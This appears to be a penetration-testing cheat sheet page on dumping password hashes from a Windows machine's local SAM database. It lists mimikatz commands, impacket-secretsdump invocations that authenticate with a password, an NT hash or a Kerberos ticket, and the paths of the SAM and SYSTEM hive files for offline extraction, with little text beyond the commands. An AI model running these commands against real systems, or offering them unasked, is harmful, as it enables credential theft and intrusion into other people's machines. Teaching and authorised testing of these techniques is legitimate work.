---
label: Local SAM
---

# Credentials dump from local SAM

> **Requirements:**
>
> - You have to be a local administrator on the machine (or SYSTEM).

SAM dump will return all local users on the system along with their hashed passwords in NT hash form.

Windows:

```powershell
.\mimikatz.exe
> privilege::debug
> token::elevate
> lsadump::sam
```

Linux:

```bash
# Using password
impacket-secretsdump $domain/$user:$password@$host

# Using NT hash
impacket-secretsdump -hashes :$nt_hash $domain/$user@$host

# Using Kerberos TGT
export KRB5CCNAME=$tgt_ccache_file
impacket-secretsdump $hostname -k -no-pass -dc-ip $dc_ipyar
```

## Offline SAM database dump

You can also steal SAM database file and SYSTEM registry hive and extract credentials offline:

- SAM: `C:\Windows\System32\config\SAM`
- SYSTEM: `C:\Windows\System32\config\SYSTEM`

```bash
# Dump credentials from local SAM and SYSTEM file
impacket-secretsdump -sam $sam_file -system $system_file LOCAL
```
